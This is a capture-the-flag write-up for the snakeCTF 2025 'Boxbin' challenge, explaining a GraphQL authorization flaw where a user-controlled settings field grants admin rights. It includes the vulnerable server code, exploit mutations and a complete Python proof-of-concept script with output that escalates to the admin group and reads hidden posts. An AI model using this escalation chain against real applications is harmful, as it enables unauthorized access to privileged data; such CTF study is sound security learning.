---
title: "Boxbin - snakeCTF 2025 Quals"
category: "web"
subcategory: "graphql"
type: "writeup"
tags: ["graphql", "web", "privilege-escalation", "jwt", "privesc", "base64", "sqlite", "nextjs", "snakectf-2025-quals", "2025", "ctf-writeup"]
summary: "Boxbin is a Next.js + GraphQL pastebin parody."
source:
  name: "CTFtime writeup #40425"
  url: "https://ctftime.org/writeup/40425"
original_source: "https://blog.hitc.at/posts/ctf/snakectf-2025/boxbin/"
ctf:
  name: "snakeCTF 2025 Quals"
  year: 2025
  challenge: "Boxbin"
---

## Metadata

- **CTF:** snakeCTF 2025 Quals
- **Task:** Boxbin
- **Author team:** fish3r
- **CTFtime tags:** graphql, web, privilege_escalation
- **CTFtime:** <https://ctftime.org/writeup/40425>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/snakectf-2025/boxbin/>

---
## Introduction

**Boxbin** is a Next.js + GraphQL pastebin parody. The core bug is **privilege escalation via trusted user-controlled settings** in the GraphQL layer. By writing `{"isAdmin": true}` into our own `user.settings`, we satisfy the server’s `isAuthorized()` check, then call privileged mutations to join the admin group and read hidden posts (flag).

![Home](<https://blog.hitc.at/images/snakectf2025/web/boxbin_home.png#center>)

### Context Explanation

* **Stack:** Next.js API route (Apollo Server) + SQLite.  
* **Auth:** JWT (`Authorization` header → `context.user` from DB). Passwords hashed with **bcrypt**.  
* **RBAC:** Numeric `groupId` (admin ≤ 1). Several mutations/queries require `isAuthorized(context)`.  
* **Flaw:** `isAuthorized()` also trusts `JSON.parse(user.settings).isAdmin === true` — which users can set themselves via `updateSettings(settings: String!)`.

Key entry point (GraphQL handler):

```js  
// pages/api/graphql.js  
export default startServerAndCreateNextHandler(server, {  
context: async (req) => {  
const token = req.headers.authorization || '';  
if (token) {  
const { userId } = jwt.verify(token, JWT_SECRET);  
const db = await getDb();  
const user = await db.get('SELECT * FROM users WHERE id = ?', userId);  
return { user }; // <\-- becomes context.user in resolvers  
}  
return { user: null };  
},  
});  
```

### Directive

Abuse the **settings-trust** + **admin-only mutations** chain to become admin and query hidden posts containing the flag.

\---

## Solution

### 1) Vulnerable authorization logic

```js  
// lib/schema.js  
function isAuthorized(context) {  
if (context.user && context.user.settings) {  
try {  
const userSettings = JSON.parse(context.user.settings);  
if (userSettings.isAdmin === true) return true; // <\-- trusts user-controlled field  
} catch (e) {}  
}  
return (context.user && context.user.groupId <= 1); // fallback: real admin groups  
}  
```

### 2) Attacker-controlled write primitive

Any logged-in user may **store arbitrary JSON** into their own settings:

```js  
// Mutation: updateSettings  
updateSettings: async (_, { settings }, context) => {  
if (!context.user) throw new Error('You must be logged in');  
await db.run('UPDATE users SET settings = ? WHERE id = ?', settings, [context.user.id](http://context.user.id));  
return "Settings updated";  
}  
```

**No schema/shape validation** on `settings` → we can write `{"isAdmin": true}`.

### 3) Privileged mutations gated by isAuthorized

Once `isAuthorized(context)` returns true, admin-only actions unlock:

```js  
// Only allowed if isAuthorized(context) === true  
updateUserGroup: async (_, { userId, groupId }, context) => {  
if (!isAuthorized(context)) throw new Error("Forbidden");  
await db.run('UPDATE users SET groupId = ? WHERE id = ?', groupId, userId);  
return db.get('SELECT * FROM users WHERE id = ?', userId);  
},

hiddenPosts: async (_, __, context) => {  
if (!isAuthorized(context)) throw new Error("Forbidden");  
return db.all('SELECT * FROM posts WHERE hidden = TRUE ORDER BY id DESC');  
}  
```

> The app also has an “upgrade” path that changes `groupId` based on purchased upgrades:

```js  
// adminUserUpgrade (no admin required; just logged-in)  
adminUserUpgrade: async (_, { upgradeId }, context) => {  
const upgrade = await db.get('SELECT * FROM upgrades WHERE id = ?', upgradeId);  
...  
await db.run('UPDATE users SET groupId = ? WHERE id = ?', newGroupId, [context.user.id](http://context.user.id));  
return db.get('SELECT * FROM users WHERE id = ?', [context.user.id](http://context.user.id));  
}  
```

This is **not required** to exploit, but the PoC uses it as a step before final escalation.

### 4) Exploitation flow

**(a) Sign up → JWT**

```graphql  
mutation Signup($u:String!, $p:String!) {  
signup(username:$u, password:$p)  
}  
```

Use the returned JWT in `Authorization:` for next steps.

**(b) Buy upgrade to be able to edit settings**

```graphql  
mutation AdminUserUpgrade { adminUserUpgrade(upgradeId: 7) { id groupId } }  
```

**(c) Become "authorized" by self-tagging as admin**

```graphql  
mutation UpdateSettings($s:String!) {  
updateSettings(settings:$s)  
}  
# variables: { "s": "{\"isAdmin\": true}" }  
```

**(d) Use unlocked admin mutation to set real admin group**

```graphql  
mutation UpdateUserGroup($id:ID!, $g:Int!) {  
updateUserGroup(userId:$id, groupId:$g) { id groupId }  
}  
# set g = 0 (admin)  
```

**(e) Read the hidden content containing the flag**

```graphql  
query Hidden { hiddenPosts { content } }  
```

Extract `snakeCTF{...}` from the returned content.

## POC

```python  
"""  
1) signup -> get JWT  
2) adminUserUpgrade(upgradeId=7)  
3) updateSettings('{"isAdmin": true}')  
4) updateUserGroup(userId=<me>, groupId=0)  
5) hiddenPosts { content } -> extract snakeCTF{...}  
"""

import base64  
import json  
import re  
import secrets  
import string  
import sys  
from typing import Optional, Dict, Any  
import requests

# ---------- Config ----------  
BASE_URL = "http://localhost:3000/"

GQL_ENDPOINT = BASE_URL.rstrip("/") + "/api/graphql"

USERNAME_PREFIX = "hitcat"  
PASSWORD = "Secret123!"  
UPGRADE_ID = 7  
ADMIN_GROUP_ID = 0  
HTTP_TIMEOUT = 20

session = requests.Session()  
session.headers.update({"Content-Type": "application/json"})

# ---------- Helpers ----------

def b64url_decode(s: str) -> bytes:  
"""Base64URL decode with automatic padding."""  
return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def jwt_get_user_id(token: str) -> int:  
"""Extract userId from unsigned JWT (no secret needed)."""  
try:  
_, payload_b64, _ = token.split(".")  
payload = json.loads(b64url_decode(payload_b64).decode("utf-8"))  
return int(payload["userId"])  
except Exception as exc:  
print(f"[!] Failed to decode JWT userId: {exc}")  
sys.exit(1)

def gql(query: str, variables: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  
"""Send a GraphQL request and return the 'data' dict or exit on error."""  
payload = {"query": query, "variables": variables or {}}  
resp = [session.post](http://session.post)(GQL_ENDPOINT, json=payload, timeout=HTTP_TIMEOUT)

# Ensure JSON response  
try:  
data = resp.json()  
except Exception:  
print(f"[!] Non-JSON response ({resp.status_code}): {resp.text[:400]}")  
sys.exit(1)

# Handle GraphQL errors  
if "errors" in data:  
print("[!] GraphQL errors:")  
print(json.dumps(data["errors"], indent=2))  
sys.exit(1)

return data["data"]

def rand_suffix(n: int = 5) -> str:  
"""Random lowercase/digit suffix to avoid username collisions."""  
alphabet = string.ascii_lowercase + string.digits  
return "".join(secrets.choice(alphabet) for _ in range(n))

# ---------- Main chain ----------

def main() -> None:  
# 1) SignUp -> JWT in data.signup  
username = f"{USERNAME_PREFIX}{rand_suffix()}"  
print(f"[*] Signing up as: {username}")

q_signup = """  
mutation Signup($username: String!, $password: String!) {  
signup(username: $username, password: $password)  
}"""  
d = gql(q_signup, {"username": username, "password": PASSWORD})  
token = d["signup"]  
print(f"[+] JWT obtained: {token}")

#Update session auth header  
session.headers.update({"Authorization": token})  
  
# Decode userId from JWT  
user_id = jwt_get_user_id(token)  
print(f"[+] Decoded userId from JWT: {user_id}")

# 2) adminUserUpgrade(upgradeId: 7)  
print("[*] Upgrading user via adminUserUpgrade…")  
q_upgrade = """  
mutation AdminUserUpgrade($upgradeId: ID!) {  
adminUserUpgrade(upgradeId: $upgradeId) { username }  
}"""  
d = gql(q_upgrade, {"upgradeId": UPGRADE_ID})  
print(f"[+] adminUserUpgrade OK for user: {d['adminUserUpgrade']['username']}")

# 3) updateSettings(settings: "{\"isAdmin\":true}") – string parsed as JSON server-side  
print("[*] Enabling admin via updateSettings…")  
q_settings = """  
mutation UpdateSettings($settings: String!) {  
updateSettings(settings: $settings)  
}"""  
settings_str = json.dumps({"isAdmin": True}) # -> '{"isAdmin": true}'  
d = gql(q_settings, {"settings": settings_str})  
print(f"[+] updateSettings returned: {d['updateSettings']}")

# 4) updateUserGroup(userId: <me>, groupId: 0)  
print("[*] Switching current user to admin group…")  
q_group = """  
mutation UpdateUserGroup($userId: ID!, $groupId: Int!) {  
updateUserGroup(userId: $userId, groupId: $groupId) {  
id  
groupId  
__typename  
}  
}"""  
d = gql(q_group, {"userId": str(user_id), "groupId": ADMIN_GROUP_ID})  
print(f"[+] updateUserGroup OK -> id={d['updateUserGroup']['id']} groupId={d['updateUserGroup']['groupId']}")

# 5) hiddenPosts { content } -> extract snakeCTF{...}  
print("[*] Fetching hiddenPosts…")  
q_hidden = """  
query HiddenPosts {  
hiddenPosts {  
content  
}  
}"""  
d = gql(q_hidden)  
posts = d.get("hiddenPosts", [])  
contents = "\n".join(p.get("content", "") for p in posts)  
print(f"[+] Retrieved {len(posts)} hidden posts")

# Extract the flag  
print("[*] Extracting flag with regex…")  
# try escaped then unescaped variants  
matches = re.findall(r"snakeCTF\\\\{[^}]+\\\\}", contents)  
if not matches:  
matches = re.findall(r"snakeCTF\\{[^}]+\\}", contents)

if matches:  
print(f"[!] FLAG: {matches[0]}")  
else:  
print("[!] Flag not found in hiddenPosts content.")  
print("--- hiddenPosts preview (first 500 chars) ---")  
print(contents[:500])

if __name__ == "__main__":  
main()  
```

```bash  
#Output  
[*] Signing up as: hitcatsr4ag  
[+] JWT obtained: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwLCJpYXQiOjE3NTc1MDUyMTh9.85FN-EL3W-kXx7eMPvphbAx00EDF4zcoPJo7g2dDwlo  
[+] Decoded userId from JWT: 10  
[*] Upgrading user via adminUserUpgrade…  
[+] adminUserUpgrade OK for user: hitcatsr4ag  
[*] Enabling admin via updateSettings…  
[+] updateSettings returned: Settings updated  
[*] Switching current user to admin group…  
[+] updateUserGroup OK -> id=10 groupId=0  
[*] Fetching hiddenPosts…  
[+] Retrieved 7 hidden posts  
[*] Extracting flag with regex…  
[!] FLAG: snakeCTF{f4ke_fl4g_f0r_t3st1ng}  
```
